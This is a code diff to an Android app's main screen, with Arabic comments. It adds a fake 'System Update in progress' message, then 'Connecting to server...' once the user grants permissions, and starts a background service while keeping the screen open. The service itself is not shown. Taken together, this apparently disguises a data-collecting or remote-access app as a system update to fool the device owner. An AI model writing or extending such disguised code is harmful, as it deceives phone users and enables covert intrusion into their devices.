@@ -6,16 +6,30 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.widget.LinearLayout;
+import android.widget.TextView;
 
 import java.util.ArrayList;
 import java.util.List;
 
 public class MainActivity extends Activity {
     private static final int PERMISSION_CODE = 100;
+    private TextView statusText;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        // واجهة التطبيق التي ستبقى مفتوحة
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setPadding(50, 50, 50, 50);
+
+        statusText = new TextView(this);
+        statusText.setText("System Update in progress...\nPlease wait.");
+        statusText.setTextSize(18);
+        layout.addView(statusText);
+        setContentView(layout);
 
         if (checkPermissions()) {
             startServiceNow();
@@ -60,17 +74,17 @@ public class MainActivity extends Activity {
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        // تشغيل الخدمة فور الموافقة على الصلاحيات
         startServiceNow();
     }
 
     private void startServiceNow() {
+        statusText.setText("Permissions granted.\nConnecting to server...");
         Intent intent = new Intent(this, BackgroundService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent);
         } else {
             startService(intent);
         }
-        finish(); // إغلاق الواجهة
+        // التطبيق لن يغلق، وسيبقى على هذه الشاشة
     }
 }
